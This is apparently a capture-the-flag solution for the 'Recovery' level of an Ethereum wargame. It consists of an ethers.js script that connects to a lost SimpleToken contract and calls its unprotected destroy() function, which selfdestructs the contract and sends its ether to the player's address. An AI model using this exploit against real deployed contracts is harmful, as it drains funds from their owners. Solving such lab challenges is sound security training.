# 17 - Recovery

### Scripted Solution

```javascript
const ethers = require('ethers')
const fs = require('fs')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return {
    provider,
    playerAddress: process.env.PLAYER_ADDRESS,
    playerWallet,
    playerWalletSigner,
    contract
  }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const { playerAddress, contract: simpleTokenContract } = await setup(
    'SimpleToken'
  )

  // Get token name at contract address
  const tokenName = await simpleTokenContract.name()
  console.log(`Contract's token name: ${tokenName}.`)

  // Call `selfdestruct` on contract via `destroy` function, sending ether to player account
  console.log('Self destructing contract...')
  const selfDestruct = await simpleTokenContract.destroy(playerAddress)
  await selfDestruct.wait(1)
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
